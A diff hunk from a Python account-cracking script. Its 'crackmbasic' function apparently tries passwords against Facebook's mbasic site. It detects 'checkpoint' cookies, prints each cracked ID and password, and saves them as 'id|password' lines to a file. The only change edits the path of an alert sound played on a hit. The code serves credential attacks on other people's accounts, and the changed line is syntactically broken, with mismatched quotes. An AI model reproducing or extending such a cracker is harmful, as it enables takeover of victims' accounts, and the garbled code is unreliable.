@@ -1809,7 +1809,7 @@ def crackmbasic(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
-				open("CP/'+cpc,'a').write(idf+'|'+pw+;os.popen("play-audio data/audio/cp.mp3")\n')
+				open("CP/'+cpc,'a').write(idf+'|'+pw+;os.popen("play-audio data/cp.mp3")\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
